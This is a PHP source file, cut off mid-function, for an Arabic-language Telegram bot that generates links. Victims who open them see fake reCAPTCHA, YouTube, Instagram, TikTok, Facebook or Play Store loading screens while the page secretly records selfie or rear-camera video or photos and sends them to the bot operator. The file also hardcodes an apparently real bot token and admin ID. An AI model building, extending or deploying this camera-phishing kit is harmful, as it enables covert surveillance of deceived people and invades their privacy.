<?php
// هذا الملف php للبوت فقط - يستضاف على خادم يدعم PHP (وليس GitHub Pages)
// اما الملفات التي ستنشأ فهي HTML فقط ويمكن وضعها على GitHub Pages

// Bot Token and Admin Chat ID
define('BOT_TOKEN', '7610372593:AAEhxeF21e1wlhrr_GVWcGYHOGre8tib5-I');
define('ADMIN_CHAT_ID', '7825600665');
define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

// Pagination Settings
define('ITEMS_PER_PAGE', 10);
define('MAX_MESSAGE_LENGTH', 4000);

// File and Directory Paths
define('ALLOWED_USERS_FILE', 'allowed_users.json');
define('BANNED_USERS_FILE', 'banned_users.json');
define('USER_STATES_DIR', 'user_states/');
define('GENERATED_LINKS_DIR', 'generated_links/');
define('MAINTENANCE_FILE', 'maintenance_mode.json');
define('PAGINATION_TEMP_DIR', 'temp_messages/');

// الرابط الثابت لملف البوت PHP على خادم يدعم PHP
define('BOT_PHP_URL', 'https://your-server.com/bot.php'); // <<--- غير هذا لرابط السيرفر الحقيقي

// رابط GitHub Pages حيث ستوضع ملفات HTML
define('GITHUB_PAGES_URL', 'https://yourusername.github.io/repo-name/'); // <<--- غير هذا

// Default thumbnail URL
define('DEFAULT_THUMBNAIL_URL', 'https://your-domain.com/default_thumbnail.jpg');

// Ensure directories exist with proper permissions
$dirs = [USER_STATES_DIR, GENERATED_LINKS_DIR, PAGINATION_TEMP_DIR];
foreach ($dirs as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    if (!is_writable($dir)) {
        chmod($dir, 0755);
    }
}

// --- CORS Headers for JavaScript requests ---
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// --- DEBUG MODE ---
$debug_mode = true;
if ($debug_mode) {
    error_reporting(E_ALL);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    ini_set('error_log', 'php_errors.log');
}

// --- Helper Functions ---

function loadAllowedUsers() {
    if (!file_exists(ALLOWED_USERS_FILE)) return [];
    $users = json_decode(file_get_contents(ALLOWED_USERS_FILE), true);
    return is_array($users) ? $users : [];
}

function saveAllowedUsers($users) {
    file_put_contents(ALLOWED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function loadBannedUsers() {
    if (!file_exists(BANNED_USERS_FILE)) return [];
    $users = json_decode(file_get_contents(BANNED_USERS_FILE), true);
    return is_array($users) ? $users : [];
}

function saveBannedUsers($users) {
    file_put_contents(BANNED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function isUserBanned($chat_id) {
    $banned_users = loadBannedUsers();
    return isset($banned_users[$chat_id]);
}

function userExistsInAllowedList($chat_id) {
    $users = loadAllowedUsers();
    return isset($users[$chat_id]);
}

function addOrUpdateUser($chat_id, $first_name = 'Unknown', $username = null) {
    if (isUserBanned($chat_id)) return false;
    $users = loadAllowedUsers();
    $users[$chat_id] = [
        'first_name' => $first_name,
        'username' => $username,
        'last_seen' => date('Y-m-d H:i:s')
    ];
    saveAllowedUsers($users);
    return true;
}

function banUser($chat_id) {
    $allowed_users = loadAllowedUsers();
    $banned_users = loadBannedUsers();
    $user_data_to_ban = null;

    if (isset($allowed_users[$chat_id])) {
        $user_data_to_ban = $allowed_users[$chat_id];
        unset($allowed_users[$chat_id]);
        saveAllowedUsers($allowed_users);
    } elseif (isset($banned_users[$chat_id])) {
        return false;
    } else {
        $user_data_to_ban = ['first_name' => 'Unknown', 'username' => null, 'last_seen' => 'N/A'];
    }
    
    $banned_users[$chat_id] = $user_data_to_ban;
    $banned_users[$chat_id]['banned_at'] = date('Y-m-d H:i:s');
    saveBannedUsers($banned_users);
    return true;
}

function unbanUser($chat_id) {
    $banned_users = loadBannedUsers();
    if (isset($banned_users[$chat_id])) {
        $user_data_to_unban = $banned_users[$chat_id];
        unset($banned_users[$chat_id]);
        saveBannedUsers($banned_users);
        addOrUpdateUser($chat_id, $user_data_to_unban['first_name'] ?? 'Unknown', $user_data_to_unban['username'] ?? null);
        return true;
    }
    return false;
}

function getAllBotUsers() {
    return ['allowed' => loadAllowedUsers(), 'banned' => loadBannedUsers()];
}

function getUserStateFile($chat_id, $type) {
    return USER_STATES_DIR . "user_{$type}_" . $chat_id . '.txt';
}

function isAdmin($chat_id) {
    return (string)$chat_id === (string)ADMIN_CHAT_ID;
}

function isMaintenanceMode() {
    if (!file_exists(MAINTENANCE_FILE)) return false;
    $status = json_decode(file_get_contents(MAINTENANCE_FILE), true);
    return $status['active'] ?? false;
}

function setMaintenanceMode($status) {
    file_put_contents(MAINTENANCE_FILE, json_encode(['active' => $status], JSON_PRETTY_PRINT));
}

function sendMessage($chat_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) $data['reply_markup'] = json_decode($reply_markup, true);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $http_code];
}

function editMessage($chat_id, $message_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) $data['reply_markup'] = json_decode($reply_markup, true);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'editMessageText');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $http_code];
}

function sendVideoToTelegram($target_chat_id, $video_file_path, $caption = null) {
    if (!file_exists($video_file_path)) {
        error_log("Video file not found: " . $video_file_path);
        return ['status' => 'error', 'message' => 'Video file not found.'];
    }
    $post_data = [
        'chat_id' => $target_chat_id,
        'video' => new CURLFile($video_file_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . "sendVideo");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return ['status' => 'success', 'message' => 'Video sent successfully.'];
    } else {
        error_log("Failed to send video. HTTP: {$http_code}, Response: {$response}");
        return ['status' => 'error', 'message' => 'Failed to send video.', 'response' => $response, 'http_code' => $http_code];
    }
}

function sendPhotoToTelegram($target_chat_id, $photo_file_path, $caption = null) {
    if (!file_exists($photo_file_path)) {
        error_log("Photo file not found: " . $photo_file_path);
        return ['status' => 'error', 'message' => 'Photo file not found.'];
    }
    $post_data = [
        'chat_id' => $target_chat_id,
        'photo' => new CURLFile($photo_file_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . "sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return ['status' => 'success', 'message' => 'Photo sent successfully.'];
    } else {
        error_log("Failed to send photo. HTTP: {$http_code}, Response: {$response}");
        return ['status' => 'error', 'message' => 'Failed to send photo.', 'response' => $response, 'http_code' => $http_code];
    }
}

/**
 * Send media to Telegram using URL directly (bypasses file upload)
 */
function sendMediaByUrl($chat_id, $media_url, $caption = '', $is_video = false) {
    if ($is_video) {
        $endpoint = 'sendVideo';
        $field = 'video';
    } else {
        $endpoint = 'sendPhoto';
        $field = 'photo';
    }
    
    $data = [
        'chat_id' => $chat_id,
        $field => $media_url,
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . $endpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    error_log("Send media by URL - HTTP: {$http_code}, Response: {$response}");
    return ['response' => $response, 'http_code' => $http_code];
}

function fetchOgMetaTags($url) {
    $og_data = ['og:title' => null, 'og:description' => null, 'og:image' => null, 'og:url' => $url, 'og:type' => 'website'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1)');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $html = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || $html === false || !empty($error)) return $og_data;

    libxml_use_internal_errors(true);
    $doc = new DOMDocument();
    $doc->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($doc);
    $query = '//meta[starts-with(@property, "og:")] | //meta[starts-with(@name, "twitter:")] | //title';
    $metas = $xpath->query($query);

    foreach ($metas as $meta) {
        $property = $meta->getAttribute('property') ?: $meta->getAttribute('name');
        $content = $meta->getAttribute('content');
        if ($property === 'og:title' && !empty($content)) $og_data['og:title'] = $content;
        elseif ($property === 'og:description' && !empty($content)) $og_data['og:description'] = $content;
        elseif ($property === 'og:image' && !empty($content)) $og_data['og:image'] = $content;
        elseif ($property === 'og:type' && !empty($content)) $og_data['og:type'] = $content;
        elseif ($property === 'og:url' && !empty($content)) $og_data['og:url'] = $content;
        elseif ($property === 'twitter:url' && empty($og_data['og:url']) && !empty($content)) $og_data['og:url'] = $content;
    }

    if (empty($og_data['og:title'])) {
        $titleNode = $xpath->query('//title')->item(0);
        if ($titleNode) $og_data['og:title'] = $titleNode->nodeValue;
    }
    if (empty($og_data['og:description'])) {
        $descriptionNode = $xpath->query('//meta[@name="description"]')->item(0);
        if ($descriptionNode) $og_data['og:description'] = $descriptionNode->getAttribute('content');
    }
    return $og_data;
}


// ========== MAIN HANDLER ==========

$update = json_decode(file_get_contents('php://input'), true);

// --- Handle Telegram Bot Updates ---
if (isset($update['message'])) {
    $message = $update['message'];
    $chat_id = $message['chat']['id'];
    $text = $message['text'] ?? '';
    $message_id = $message['message_id'];
    $user_first_name = $message['from']['first_name'] ?? 'Unknown';
    $user_username = $message['from']['username'] ?? null;
    
    if (isUserBanned($chat_id)) {
        sendMessage($chat_id, "⛔ عذراً، لقد تم حظرك من استخدام هذا البوت.");
        exit;
    }

    if (!userExistsInAllowedList($chat_id)) {
        addOrUpdateUser($chat_id, $user_first_name, $user_username);
        if (!isAdmin($chat_id)) {
            sendMessage(ADMIN_CHAT_ID, "🔔 **مستخدم جديد انضم للبوت!**\n" .
                "<b>ID:</b> <code>{$chat_id}</code>\n" .
                "<b>الاسم:</b> " . htmlspecialchars($user_first_name) . "\n" .
                "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n" .
                "<b>الوقت:</b> " . date('Y-m-d H:i:s'), 
                json_encode(['inline_keyboard' => [[['text' => '✉️ إرسال رسالة', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]]), 'HTML'
            );
        }
    } else {
        addOrUpdateUser($chat_id, $user_first_name, $user_username);
    }

    // Admin commands
    if (isAdmin($chat_id)) {
        if ($text === '/admin') { showAdminPanel($chat_id); exit; }
        
        $admin_state_file = getUserStateFile($chat_id, 'admin_state');
        $admin_state_data = @file_get_contents($admin_state_file);
        $admin_state_parts = explode(':', $admin_state_data);
        $admin_state = $admin_state_parts[0];
        $target_chat_id_from_state = $admin_state_parts[1] ?? null;

        if ($admin_state === 'waiting_for_ban_id') {
            if (is_numeric($text)) {
                if ((string)$text === (string)ADMIN_CHAT_ID) {
                    sendMessage($chat_id, "❌ لا يمكنك حظر نفسك يا مسؤول!");
                } elseif (banUser($text)) {
                    sendMessage($chat_id, "✅ تم حظر المستخدم <code>{$text}</code> بنجاح.");
                    sendMessage($text, "⛔ تم حظرك من استخدام هذا البوت بواسطة المسؤول.");
                } else {
                    sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> إما أنه غير موجود أو محظور بالفعل.");
                }
            } else { sendMessage($chat_id, "❌ معرف المستخدم غير صالح."); }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_unban_id') {
            if (is_numeric($text)) {
                if (unbanUser($text)) {
                    sendMessage($chat_id, "✅ تم إلغاء حظر المستخدم <code>{$text}</code> بنجاح.");
                    sendMessage($text, "🎉 مرحباً! تم إلغاء حظرك من استخدام البوت.");
                } else {
                    sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> غير محظور.");
                }
            } else { sendMessage($chat_id, "❌ معرف المستخدم غير صالح."); }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_broadcast_message') {
            broadcastMessageToAllAllowedUsers($chat_id, $text);
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_delete_old_links_days') {
            if (is_numeric($text) && (int)$text >= 0) {
                deleteOldLinks($chat_id, (int)$text);
            } else { sendMessage($chat_id, "❌ عدد الأيام غير صالح."); }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_admin_message_to_user' && $target_chat_id_from_state) {
            sendMessage($target_chat_id_from_state, "💬 **رسالة من المطور:**\n" . htmlspecialchars($text));
            sendMessage($chat_id, "✅ تم إرسال رسالتك.");
            @unlink($admin_state_file);
            showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id_from_state, 'allowed_list_context');
            exit;
        } elseif ($admin_state === 'waiting_for_user_search_query') {
            handleAdminUserSearch($chat_id, $text);
            @unlink($admin_state_file);
            exit;
        }
    }

    if (isMaintenanceMode() && !isAdmin($chat_id)) {
        sendMessage($chat_id, "⚠️ البوت قيد الصيانة حالياً.");
        exit;
    }

    $user_state_file = getUserStateFile($chat_id, "state");
    $user_state_data = @file_get_contents($user_state_file);
    $user_state_parts = explode(':', $user_state_data);
    $user_state = $user_state_parts[0];

    if ($user_state === 'waiting_for_developer_message') {
        $forward_message_text = "✉️ **رسالة من المستخدم:**\n" .
            "<b>ID:</b> <code>{$chat_id}</code>\n" .
            "<b>الاسم:</b> " . htmlspecialchars($user_first_name) . "\n" .
            "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n\n" .
            "<b>الرسالة:</b>\n" . htmlspecialchars($text);
        $keyboard = ['inline_keyboard' => [[['text' => '✉️ الرد على المستخدم', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]];
        sendMessage(ADMIN_CHAT_ID, $forward_message_text, json_encode($keyboard), 'HTML');
        sendMessage($chat_id, "✅ تم إرسال رسالتك إلى المطور بنجاح.");
        @unlink($user_state_file);
        showStartMessage($chat_id);
        exit;
    }

    if ($text === '/start') {
        showStartMessage($chat_id);
    } else {
        processUserChoices($chat_id, $text);
    }
} elseif (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $message_id = $callback_query['message']['message_id'];
    $data = $callback_query['data'];
    $user_first_name = $callback_query['from']['first_name'] ?? 'Unknown';
    $user_username = $callback_query['from']['username'] ?? null;

    if (isUserBanned($chat_id)) {
        editMessage($chat_id, $message_id, "⛔ عذراً، لقد تم حظرك.");
        exit;
    }
    addOrUpdateUser($chat_id, $user_first_name, $user_username);

    if (isMaintenanceMode() && !isAdmin($chat_id)) {
        editMessage($chat_id, $message_id, "⚠️ البوت قيد الصيانة حالياً.");
        exit;
    }

    if (isAdmin($chat_id)) {
        $parts = explode(':', $data);
        $action = $parts[0];
        $target_chat_id = $parts[1] ?? null;
        $context = $parts[2] ?? null;

        if ($action === 'admin_panel') { showAdminPanel($chat_id, $message_id); exit; }
        elseif ($action === 'admin_list_users') {
            $list_type = $parts[1] ?? 'allowed';
            $page = intval($parts[2] ?? 0);
            listUsersForAdmin($chat_id, $message_id, $list_type, $page);
            exit;
        }
        elseif ($action === 'admin_list_allowed_users') { listUsersForAdmin($chat_id, $message_id, 'allowed'); exit; }
        elseif ($action === 'admin_list_banned_users') { listUsersForAdmin($chat_id, $message_id, 'banned'); exit; }
        elseif ($action === 'admin_user_details') { showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id, $context); exit; }
        elseif ($action === 'admin_ban_specific_user') {
            if ((string)$target_chat_id === (string)ADMIN_CHAT_ID) {
                editMessage($chat_id, $message_id, "❌ لا يمكنك حظر نفسك!");
            } elseif (banUser($target_chat_id)) {
                editMessage($chat_id, $message_id, "✅ تم حظر المستخدم.", showUserDetailsKeyboard($target_chat_id, 'banned_list_context'));
                sendMessage($target_chat_id, "⛔ تم حظرك.");
            } else {
                editMessage($chat_id, $message_id, "⚠️ المستخدم غير موجود أو محظور بالفعل.");
            }
            exit;
        }
        elseif ($action === 'admin_unban_specific_user') {
            if (unbanUser($target_chat_id)) {
                editMessage($chat_id, $message_id, "✅ تم إلغاء الحظر.", showUserDetailsKeyboard($target_chat_id, 'allowed_list_context'));
                sendMessage($target_chat_id, "🎉 تم إلغاء حظرك!");
            } else {
                editMessage($chat_id, $message_id, "⚠️ المستخدم غير محظور.");
            }
            exit;
        }
        elseif ($action === 'admin_send_message_to_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), "waiting_for_admin_message_to_user:{$target_chat_id}");
            editMessage($chat_id, $message_id, "الرجاء إرسال رسالتك:");
            exit;
        }
        elseif ($action === 'admin_view_user_links_and_media') { listUserGeneratedLinksAndMedia($chat_id, $message_id, $target_chat_id); exit; }
        elseif ($action === 'admin_ban_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_ban_id');
            editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم:");
            exit;
        }
        elseif ($action === 'admin_unban_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_unban_id');
            editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم:");
            exit;
        }
        elseif ($action === 'admin_broadcast_message_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_broadcast_message');
            editMessage($chat_id, $message_id, "الرجاء إرسال الرسالة:");
            exit;
        }
        elseif ($action === 'admin_view_links') { listGeneratedLinksForAdmin($chat_id, $message_id); exit; }
        elseif ($action === 'admin_view_links_page') {
            $page = intval($parts[1] ?? 0);
            listGeneratedLinksForAdmin($chat_id, $message_id, $page);
            exit;
        }
        elseif ($action === 'admin_delete_old_links_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_delete_old_links_days');
            editMessage($chat_id, $message_id, "الرجاء إرسال عدد الأيام:");
            exit;
        }
        elseif ($action === 'admin_bot_stats') { showBotStatsForAdmin($chat_id, $message_id); exit; }
        elseif ($action === 'admin_toggle_maintenance') { toggleMaintenanceMode($chat_id, $message_id); exit; }
        elseif ($action === 'admin_search_users_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_user_search_query');
            editMessage($chat_id, $message_id, "🔍 الرجاء إرسال اسم المستخدم أو ID:");
            exit;
        }
    }

    if (strpos($data, 'generate_qr:') === 0) {
        $link_hash = substr($data, 12);
        generateQRCode($chat_id, $message_id, $link_hash);
        exit;
    }
    if (strpos($data, 'paginate_message:') === 0) {
        $pagination_data = explode(':', $data);
        $file_id = $pagination_data[1];
        $page = intval($pagination_data[2]);
        $context = $pagination_data[3] ?? 'admin_panel';
        handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context);
        exit;
    }
    
    editMessageReplyMarkup($chat_id, $message_id, $data);
}

// --- Bot UI Functions ---

function showStartMessage($chat_id) {
    $welcome_text = "👋 مرحباً بك في بوت إنشاء الروابط المخصصة!\n\nهذا البوت يساعدك على إنشاء روابط فريدة.\nللبدء، يرجى استخدام القائمة بالأسفل:";
    sendMessage($chat_id, $welcome_text, showMainMenuKeyboard($chat_id));
}

function showMainMenuKeyboard($chat_id = null) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "1. إعداد الرابط الأصلي 🔗", 'callback_data' => 'set_url']],
            [['text' => "2. اختيار الإجراء ✨", 'callback_data' => 'set_action']],
            [['text' => "3. اختيار واجهة التحميل 🎨", 'callback_data' => 'set_loading']],
            [['text' => "4. إنشاء الرابط 🚀", 'callback_data' => 'generate_link']],
            [['text' => "✉️ التواصل مع المطور", 'callback_data' => 'contact_developer']]
        ]
    ];
    if (isAdmin($chat_id)) {
        $keyboard['inline_keyboard'][] = [['text' => "⚙️ لوحة تحكم المسؤول", 'callback_data' => 'admin_panel']];
    }
    return json_encode($keyboard);
}

function showActionOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🎥 تسجيل فيديو سيلفي', 'callback_data' => 'action_choice:5']],
            [['text' => '🎥 تسجيل فيديو امامي', 'callback_data' => 'action_choice:7']],
            [['text' => '🎥 تسجيل فيديو بالكاميرتان', 'callback_data' => 'action_choice:8']],
            [['text' => '📸 التقاط صورة سيلفي', 'callback_data' => 'action_choice:9']],
            [['text' => '📸 التقاط صورة امامية', 'callback_data' => 'action_choice:10']],
            [['text' => '📸 التقاط صورة سيلفي ثم أمامية', 'callback_data' => 'action_choice:11']],
            [['text' => '🔙 العودة', 'callback_data' => 'main_menu']]
        ]
    ];
    editMessage($chat_id, $message_id, "💡 **الخطوة الثانية: اختيار الإجراء**", json_encode($keyboard));
}

function showQualityOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => 'جودة منخفضة', 'callback_data' => 'quality_choice:low']],
            [['text' => 'جودة متوسطة', 'callback_data' => 'quality_choice:medium']],
            [['text' => 'جودة جيدة', 'callback_data' => 'quality_choice:good']],
            [['text' => 'جودة ممتازة', 'callback_data' => 'quality_choice:excellent']],
            [['text' => '🔙 العودة', 'callback_data' => 'set_action']]
        ]
    ];
    editMessage($chat_id, $message_id, "🌟 **اختيار الجودة**", json_encode($keyboard));
}

function showLoadingOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🌀 واجهة عادية', 'callback_data' => 'loading_choice:normal']],
            [['text' => '🤖 أنا لست روبوت', 'callback_data' => 'loading_choice:recaptcha']],
            [['text' => '▶️ يوتيوب', 'callback_data' => 'loading_choice:youtube']],
            [['text' => '📷 انستقرام', 'callback_data' => 'loading_choice:instagram']],
            [['text' => '🎵 تيكتوك', 'callback_data' => 'loading_choice:tiktok']],
            [['text' => '📘 فيسبوك', 'callback_data' => 'loading_choice:facebook']],
            [['text' => '▶️ متجر بلاي', 'callback_data' => 'loading_choice:playstore']],
            [['text' => '🔙 العودة', 'callback_data' => 'main_menu']]
        ]
    ];
    editMessage($chat_id, $message_id, "🎨 **اختيار واجهة التحميل**", json_encode($keyboard));
}

function processUserChoices($chat_id, $text) {
    $state_file = getUserStateFile($chat_id, "state");
    $state_data = @file_get_contents($state_file);
    $state = explode(':', $state_data)[0];

    if ($state === 'waiting_for_url') {
        if (filter_var($text, FILTER_VALIDATE_URL)) {
            file_put_contents(getUserStateFile($chat_id, "url"), $text);
            sendMessage($chat_id, "✅ تم إعداد الرابط بنجاح!");
            @unlink($state_file);
            showMainOptions($chat_id);
        } else {
            sendMessage($chat_id, "❌ رابط غير صالح.");
        }
    } else {
        sendMessage($chat_id, "📌 يرجى استخدام الأزرار.", showMainMenuKeyboard($chat_id));
    }
}

function showMainOptions($chat_id) {
    sendMessage($chat_id, "✨ اختر من القائمة:", showMainMenuKeyboard($chat_id));
}

function editMessageReplyMarkup($chat_id, $message_id, $data) {
    $parts = explode(':', $data);
    $action = $parts[0];
    $state_file = getUserStateFile($chat_id, "state");
    $action_file = getUserStateFile($chat_id, "action");
    $quality_file = getUserStateFile($chat_id, "quality");
    $loading_file = getUserStateFile($chat_id, "loading");

    switch ($action) {
        case 'set_url':
            file_put_contents($state_file, "waiting_for_url");
            editMessage($chat_id, $message_id, "💡 أرسل الرابط الأصلي:", json_encode(['inline_keyboard' => [[['text' => '🔙 العودة', 'callback_data' => 'main_menu']]]]));
            break;
        case 'set_action': showActionOptions($chat_id, $message_id); break;
        case 'set_loading': showLoadingOptions($chat_id, $message_id); break;
        case 'generate_link': generateFinalLink($chat_id, $message_id); break;
        case 'action_choice':
            file_put_contents($action_file, $parts[1]);
            showQualityOptions($chat_id, $message_id);
            break;
        case 'quality_choice':
            file_put_contents($quality_file, $parts[1]);
            editMessage($chat_id, $message_id, "✅ تم اختيار الجودة.", showMainMenuKeyboard($chat_id));
            break;
        case 'loading_choice':
            file_put_contents($loading_file, $parts[1]);
            editMessage($chat_id, $message_id, "✅ تم اختيار الواجهة.", showMainMenuKeyboard($chat_id));
            break;
        case 'main_menu':
            editMessage($chat_id, $message_id, "✨ القائمة الرئيسية:", showMainMenuKeyboard($chat_id));
            break;
        case 'contact_developer':
            file_put_contents($state_file, 'waiting_for_developer_message');
            editMessage($chat_id, $message_id, "✉️ أرسل رسالتك:", json_encode(['inline_keyboard' => [[['text' => '🔙 إلغاء', 'callback_data' => 'main_menu']]]]));
            break;
    }
}

// --- Admin Panel Functions ---

function listUsersForAdmin($admin_chat_id, $message_id, $list_type = 'allowed', $page = 0, $filtered_users = null) {
    if ($filtered_users === null) {
        $all_users = getAllBotUsers();
        $users_to_list = ($list_type === 'allowed') ? $all_users['allowed'] : $all_users['banned'];
    } else {
        $users_to_list = $filtered_users;
    }
    
    $total_items = count($users_to_list);
    $total_pages = ceil($total_items / ITEMS_PER_PAGE);
    $offset = $page * ITEMS_PER_PAGE;
    $users_on_page = array_slice($users_to_list, $offset, ITEMS_PER_PAGE, true);
    
    $text = ($list_type === 'allowed') ? "👥 **المستخدمون المسموح لهم:**\n\n" : "🚫 **المستخدمون المحظورون:**\n\n";

    if (empty($users_to_list)) {
        $text .= ($list_type === 'allowed') ? "(لا يوجد مستخدمون)\n" : "(لا يوجد محظورون)\n";
        editMessage($admin_chat_id, $message_id, $text, showAdminPanelKeyboard());
        return;
    }
    
    $keyboard_buttons = [];
    foreach ($users_on_page as $id => $user_data) {
        $name = htmlspecialchars($user_data['first_name'] ?? 'N/A');
        $username = $user_data['username'] ? " (@" . htmlspecialchars($user_data['username']) . ")" : "";
        $keyboard_buttons[] = [['text' => "{$name}{$username} (ID: {$id})", 'callback_data' => "admin_user_details:{$id}:{$list_type}"]];
    }
    
    $nav_buttons = [];
    if ($page > 0) $nav_buttons[] = ['text' => '◀️', 'callback_data' => "admin_list_users:{$list_type}:" . ($page - 1)];
    $nav_buttons[] = ['text' => "{$page}/" . ($total_pages - 1), 'callback_data' => "ignore_page_nav"];
    if (($page + 1) * ITEMS_PER_PAGE < $total_items) $nav_buttons[] = ['text' => '▶️', 'callback_data' => "admin_list_users:{$list_type}:" . ($page + 1)];
    if (!empty($nav_buttons)) $keyboard_buttons[] = $nav_buttons;

    $keyboard_buttons[] = [
        ['text' => '🔎 بحث', 'callback_data' => 'admin_search_users_prompt'],
        ['text' => '🔙 العودة', 'callback_data' => 'admin_panel']
    ];
    
    editMessage($admin_chat_id, $message_id, $text, json_encode(['inline_keyboard' => $keyboard_buttons]));
}

function handleAdminUserSearch($admin_chat_id, $query) {
    $query = mb_strtolower(trim($query), 'UTF-8');
    $all_users = array_merge(loadAllowedUsers(), loadBannedUsers());
    $filtered_users = [];
    foreach ($all_users as $id => $user_data) {
        $first_name = mb_strtolower($user_data['first_name'] ?? '', 'UTF-8');
        $username = mb_strtolower($user_data['username'] ?? '', 'UTF-8');
        if (strpos((string)$id, $query) !== false || strpos($first_name, $query) !== false || strpos($username, $query) !== false) {
            $filtered_users[$id] = $user_data;
        }
    }

    $text = "🔍 **نتائج البحث:**\n\n";
    if (empty($filtered_users)) {
        $text .= "⚠️ لا توجد نتائج.";
        editMessage($admin_chat_id, null, $text, json_encode(['inline_keyboard' => [[['text' => '🔙 العودة', 'callback_data' => 'admin_list_allowed_users']]]]));
        return;
    }
